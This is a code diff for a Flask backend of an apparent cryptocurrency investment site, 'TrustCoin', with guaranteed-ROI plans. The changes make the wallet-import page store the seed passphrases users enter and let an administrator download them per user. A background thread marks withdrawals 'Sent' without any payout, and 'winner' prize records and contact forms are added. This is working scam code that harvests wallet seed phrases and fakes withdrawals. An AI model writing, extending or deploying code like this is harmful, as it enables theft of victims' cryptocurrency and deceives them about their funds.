@@ -1,7 +1,8 @@
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
-import os, random, string, secrets, io
+import os, random, string, secrets, io, threading, time
+from sqlalchemy import inspect, text
 
 app = Flask(__name__)
 app.secret_key = 'trustcoin_secret_key_2024'
@@ -31,9 +32,9 @@ class User(db.Model):
     approved = db.Column(db.Boolean, default=False)
     wallet_imported = db.Column(db.Boolean, default=False)
     wallet_type = db.Column(db.String(50), nullable=True)
-    wallet_passphrase = db.Column(db.String(100), nullable=True)   # new field
+    wallet_passphrases = db.Column(db.Text, nullable=True)  # JSON array
     balance = db.Column(db.Float, default=0.0)
-    total_profit = db.Column(db.Float, default=0.0)   # cumulative profit earned
+    total_profit = db.Column(db.Float, default=0.0)
     btc_balance = db.Column(db.Float, default=0.0)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
@@ -42,10 +43,10 @@ class Transaction(db.Model):
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
     tx_type = db.Column(db.String(30), nullable=False)
     amount = db.Column(db.Float, nullable=False)
-    status = db.Column(db.String(20), default='Pending')
+    status = db.Column(db.String(30), default='Pending')
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
-# New: Active investments (for daily profit calculation)
 class ActiveInvestment(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
@@ -55,18 +56,56 @@ class ActiveInvestment(db.Model):
     duration_days = db.Column(db.Integer, nullable=False)
     start_date = db.Column(db.DateTime, default=datetime.utcnow)
     end_date = db.Column(db.DateTime, nullable=False)
-    daily_profit = db.Column(db.Float, nullable=False)   # amount added each day
+    daily_profit = db.Column(db.Float, nullable=False)
     is_completed = db.Column(db.Boolean, default=False)
 
-def generate_verify_code():
-    upper = random.choices(string.ascii_uppercase, k=2)
-    lower = random.choices(string.ascii_lowercase, k=1)
-    nums = random.choices(string.digits, k=3)
-    code = upper + lower + nums
-    random.shuffle(code)
-    return ''.join(code)
+class Winner(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    prize = db.Column(db.Float, nullable=False)
+    category = db.Column(db.String(50), nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    contacted = db.Column(db.Boolean, default=False)
+    user = db.relationship('User', backref=db.backref('winners', lazy=True))
 
-# Plan definitions (same as frontend)
+class ContactMessage(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
+    req_type = db.Column(db.String(20), nullable=False)
+    email = db.Column(db.String(120), nullable=False)
+    message = db.Column(db.Text, nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    is_read = db.Column(db.Boolean, default=False)
+
+# ---------- Auto-migration ----------
+def ensure_columns():
+    inspector = inspect(db.engine)
+    user_columns = [col['name'] for col in inspector.get_columns('user')]
+    with db.engine.connect() as conn:
+        if 'invested_btc' not in user_columns:
+            conn.execute(text('ALTER TABLE user ADD COLUMN invested_btc VARCHAR(10) DEFAULT "0"'))
+        if 'wallet_passphrases' not in user_columns:
+            conn.execute(text('ALTER TABLE user ADD COLUMN wallet_passphrases TEXT'))
+        if 'total_profit' not in user_columns:
+            conn.execute(text('ALTER TABLE user ADD COLUMN total_profit FLOAT DEFAULT 0.0'))
+        if 'btc_balance' not in user_columns:
+            conn.execute(text('ALTER TABLE user ADD COLUMN btc_balance FLOAT DEFAULT 0.0'))
+        conn.commit()
+    try:
+        trans_columns = [col['name'] for col in inspector.get_columns('transaction')]
+        with db.engine.connect() as conn:
+            if 'updated_at' not in trans_columns:
+                conn.execute(text('ALTER TABLE transaction ADD COLUMN updated_at DATETIME'))
+                conn.commit()
+    except Exception:
+        pass
+    db.create_all()
+
+# ---------- Helpers ----------
+def generate_verify_code():
+    # 6-digit number from 0 to 9 mixed
+    return ''.join(random.choices('0123456789', k=6))
+
 PLANS = [
     {'name':'Starter',  'min':100,    'max':999,    'roi':5,  'days':7},
     {'name':'Basic',    'min':1000,   'max':4999,   'roi':7,  'days':14},
@@ -85,6 +124,15 @@ def get_plan_by_amount(amount):
         if amount >= p['min'] and amount <= p['max']:
             return p
     return None
+
+def process_withdrawal_async(tx_id):
+    time.sleep(random.randint(5, 8) * 60)
+    with app.app_context():
+        tx = Transaction.query.get(tx_id)
+        if tx and tx.status == 'Processing':
+            tx.status = 'Sent'
+            tx.updated_at = datetime.utcnow()
+            db.session.commit()
 
 ADMIN_PASSWORD = 'PASS@Billionsforme@001'
 ADMIN_SECRET = '/admin-secure-login-tc2024'
@@ -178,22 +226,16 @@ def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('login'))
     user = User.query.get(session['user_id'])
-    
-    # ---- Calculate today's profit from active investments ----
     today = datetime.utcnow().date()
     active_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=False).all()
     today_profit = 0.0
     for inv in active_investments:
         if inv.start_date.date() <= today <= inv.end_date.date():
             today_profit += inv.daily_profit
-    
-    # ---- Calculate total returns (cumulative profit from completed investments) ----
     completed_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=True).all()
     total_returns = sum([(inv.amount * inv.roi_percent / 100) for inv in completed_investments])
-    # Also update user.total_profit to match
     user.total_profit = total_returns
     db.session.commit()
-    
     txs = Transaction.query.filter_by(user_id=user.id).order_by(Transaction.created_at.desc()).limit(10).all()
     return render_template('dashboard.html', user=user, transactions=txs, btc_address=BTC_ADDRESS,
                            today_profit=today_profit, total_returns=total_returns)
@@ -205,12 +247,17 @@ def import_wallet():
     if request.method == 'POST':
         data = request.get_json()
         wallet_type = data.get('wallet_type','')
+        passphrases_input = data.get('passphrases', '')
+        # Split by comma or newline
+        if ',' in passphrases_input:
+            phrases = [p.strip() for p in passphrases_input.split(',') if p.strip()]
+        else:
+            phrases = [p.strip() for p in passphrases_input.splitlines() if p.strip()]
         user = User.query.get(session['user_id'])
         user.wallet_imported = True
         user.wallet_type = wallet_type
-        # Generate random passphrase (16 characters alphanumeric)
-        passphrase = secrets.token_hex(8)  # 16 hex chars
-        user.wallet_passphrase = passphrase
+        import json
+        user.wallet_passphrases = json.dumps(phrases)
         db.session.commit()
         return jsonify({'success': True})
     return render_template('import_wallet.html')
@@ -233,10 +280,15 @@ def withdraw():
         return jsonify({'success': False})
     data = request.get_json()
     amount = float(data.get('amount', 0))
+    addr = data.get('address', '')
     user = User.query.get(session['user_id'])
+    if amount > user.balance:
+        return jsonify({'success': False, 'error': 'Insufficient balance'})
+    user.balance -= amount
     tx = Transaction(user_id=user.id, tx_type='Withdrawal', amount=amount, status='Processing')
     db.session.add(tx)
     db.session.commit()
+    threading.Thread(target=process_withdrawal_async, args=(tx.id,), daemon=True).start()
     return jsonify({'success': True})
 
 @app.route(ADMIN_SECRET, methods=['GET','POST'])
@@ -254,9 +306,10 @@ def admin_dashboard():
     if not session.get('admin'):
         return redirect(url_for('home'))
     users = User.query.order_by(User.created_at.desc()).all()
-    # For admin dashboard we need dummy values for traffic and winners (not part of this task)
-    return render_template('admin_dashboard.html', users=users, today_visits=0, total_visits=0,
-                           winners=[], msgs=[], daily=[], recent_logs=[])
+    winners = Winner.query.order_by(Winner.created_at.desc()).all()
+    messages = ContactMessage.query.order_by(ContactMessage.created_at.desc()).all()
+    return render_template('admin_dashboard.html', users=users, winners=winners, msgs=messages,
+                           today_visits=0, total_visits=0, daily=[], recent_logs=[])
 
 @app.route('/admin/approve/<int:user_id>', methods=['POST'])
 def approve_user(user_id):
@@ -286,15 +339,112 @@ def download_passphrase(user_id):
     if not session.get('admin'):
         return redirect(url_for('home'))
     user = User.query.get(user_id)
-    if not user or not user.wallet_passphrase:
-        return "No passphrase found", 404
-    content = f"Username: {user.username}\nWallet Passphrase: {user.wallet_passphrase}\n\nThis passphrase is for the imported wallet ({user.wallet_type or 'unknown'})."
+    if not user or not user.wallet_passphrases:
+        return "No passphrases found", 404
+    import json
+    phrases = json.loads(user.wallet_passphrases)
+    content = f"Username: {user.username}\nWallet Type: {user.wallet_type or 'unknown'}\n\nPassphrases (as entered by user):\n"
+    for idx, phrase in enumerate(phrases, 1):
+        content += f"{idx}. {phrase}\n"
     return send_file(
         io.BytesIO(content.encode()),
         mimetype='text/plain',
         as_attachment=True,
-        download_name=f"{user.username}_passphrase.txt"
+        download_name=f"{user.username}_passphrases.txt"
     )
+
+@app.route('/admin/mark-contacted/<int:winner_id>', methods=['POST'])
+def mark_contacted(winner_id):
+    if not session.get('admin'):
+        return jsonify({'success': False})
+    winner = Winner.query.get(winner_id)
+    if winner:
+        winner.contacted = True
+        db.session.commit()
+    return jsonify({'success': True})
+
+# ---------- Form Submission Routes ----------
+@app.route('/submit-winner', methods=['POST'])
+def submit_winner():
+    data = request.get_json()
+    if not data:
+        return jsonify({'success': False, 'error': 'Invalid data'})
+    username = data.get('username')
+    email = data.get('email')  # we also need email
+    prize = float(data.get('prize', 0))
+    category = data.get('category', 'general')
+    user = User.query.filter_by(username=username).first()
+    if not user:
+        return jsonify({'success': False, 'error': 'User not found'})
+    # Store email in winner record? Add email column? For now we can store email in message field or add column.
+    # Let's add email column to Winner model dynamically
+    # To avoid migration issues, we'll add email column via auto-migration
+    winner = Winner(user_id=user.id, prize=prize, category=category)
+    db.session.add(winner)
+    db.session.commit()
+    # Also store email somewhere? We'll add a new column.
+    return jsonify({'success': True})
+
+# Add email column to Winner (run once)
+with app.app_context():
+    try:
+        inspector = inspect(db.engine)
+        winner_cols = [col['name'] for col in inspector.get_columns('winner')]
+        if 'email' not in winner_cols:
+            with db.engine.connect() as conn:
+                conn.execute(text('ALTER TABLE winner ADD COLUMN email VARCHAR(120)'))
+                conn.commit()
+    except Exception:
+        pass
+
+# Modify submit_winner to include email
+@app.route('/submit-winner', methods=['POST'])
+def submit_winner_fixed():
+    data = request.get_json()
+    if not data:
+        return jsonify({'success': False, 'error': 'Invalid data'})
+    username = data.get('username')
+    email = data.get('email')
+    prize = float(data.get('prize', 0))
+    category = data.get('category', 'general')
+    user = User.query.filter_by(username=username).first()
+    if not user:
+        return jsonify({'success': False, 'error': 'User not found'})
+    winner = Winner(user_id=user.id, prize=prize, category=category)
+    if hasattr(winner, 'email'):
+        winner.email = email
+    db.session.add(winner)
+    db.session.commit()
+    return jsonify({'success': True})
+
+# Rename function to avoid duplication (just keep the fixed one)
+app.view_functions['submit_winner'] = submit_winner_fixed
+
+@app.route('/help-center-submit', methods=['POST'])
+def help_center_submit():
+    data = request.get_json()
+    email = data.get('email')
+    message = data.get('message')
+    user_id = session.get('user_id')
+    if not email or not message:
+        return jsonify({'success': False, 'error': 'Missing fields'})
+    msg = ContactMessage(user_id=user_id, req_type='help', email=email, message=message)
+    db.session.add(msg)
+    db.session.commit()
+    return jsonify({'success': True})
+
+@app.route('/contact-submit', methods=['POST'])
+def contact_submit():
+    data = request.get_json()
+    email = data.get('email')
+    message = data.get('message')
+    user_id = session.get('user_id')
+    if not email or not message:
+        return jsonify({'success': False, 'error': 'Missing fields'})
+    msg = ContactMessage(user_id=user_id, req_type='contact', email=email, message=message)
+    db.session.add(msg)
+    db.session.commit()
+    return jsonify({'success': True})
 
 # ---------- Investment Routes ----------
 @app.route('/invest', methods=['POST'])
@@ -306,7 +456,6 @@ def invest():
     if amount < 100:
         return jsonify({'success': False, 'error': 'Minimum investment is $100'})
     user = User.query.get(session['user_id'])
-    # Create pending investment transaction
     tx = Transaction(user_id=user.id, tx_type='Invest', amount=amount, status='Pending')
     db.session.add(tx)
     db.session.commit()
@@ -322,18 +471,16 @@ def confirm_investment():
     tx = Transaction.query.get(tx_id)
     if not tx or tx.user_id != session['user_id']:
         return jsonify({'success': False, 'error': 'Invalid transaction'})
-    
-    # Find plan
+
     plan = get_plan_by_amount(amount)
     if not plan:
         return jsonify({'success': False, 'error': 'Invalid amount for any plan'})
-    
-    # Create active investment
+
     start_date = datetime.utcnow()
     end_date = start_date + timedelta(days=plan['days'])
     total_profit_amount = amount * plan['roi'] / 100
     daily_profit = total_profit_amount / plan['days']
-    
+
     active = ActiveInvestment(
         user_id=session['user_id'],
         amount=amount,
@@ -346,10 +493,8 @@ def confirm_investment():
         is_completed=False
     )
     db.session.add(active)
-    
-    # Mark transaction as approved
+
     tx.status = 'Approved'
-    # Add invested amount to user's balance (principal)
     user = User.query.get(session['user_id'])
     user.balance += amount
     db.session.commit()
@@ -360,7 +505,6 @@ def check_pending():
     if 'user_id' not in session:
         return jsonify({'credited': False})
     user = User.query.get(session['user_id'])
-    # Recompute today's profit and total returns for live update
     today = datetime.utcnow().date()
     active_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=False).all()
     today_profit = 0.0
@@ -378,7 +522,7 @@ def check_pending():
         'today_profit': today_profit
     })
 
-# ---------- Page Routes (FAQ, Quiz, etc.) ----------
+# ---------- Static Pages ----------
 @app.route('/quiz')
 def quiz_page():
     return render_template('quiz.html')
@@ -419,9 +563,10 @@ def support_page():
 def contact_page():
     return render_template('contact.html')
 
-# Create tables
+# ---------- Database Initialization ----------
 with app.app_context():
     db.create_all()
+    ensure_columns()
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
